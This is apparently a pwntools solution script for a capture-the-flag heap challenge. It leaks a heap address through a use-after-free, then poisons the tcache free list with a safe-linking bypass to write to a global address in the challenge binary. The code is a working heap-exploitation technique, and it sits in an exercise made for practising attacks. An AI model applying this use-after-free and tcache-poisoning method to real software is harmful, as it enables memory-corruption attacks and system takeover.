#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        # b*0x4016F4 

        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('chals1.apoorvctf.xyz', 6001)
else:
    p = process([exe.path])
GDB()

def new():
    slna(b'> ', 1)

def cancel(idx):
    slna(b'> ', 2)
    slna(b'Slot: ', idx)

def inspect(idx):
    slna(b'> ', 3)
    slna(b'Slot: ', idx)
    a = p.recvline()

def modify(idx, data):
    slna(b'> ', 4)
    slna(b'Slot: ', idx)
    sla(b'New filling: "', data)

new()
cancel(0)
inspect(0)

heap_base = u64(p.recv(3).ljust(8, b'\0')) << 12
info(f'heap base: {hex(heap_base)}')
victim  = 0x4040c0 
new()
new()
cancel(2)
cancel(0)

load = p64(
    (heap_base +0x300 >> 12) ^ victim
)

modify(0, load)

new()
new()

modify(1, p64(0xCAFEBABE))
modify(4, p64(heap_base +0x2d0))

slna(b'> ', 5)


p.interactive()
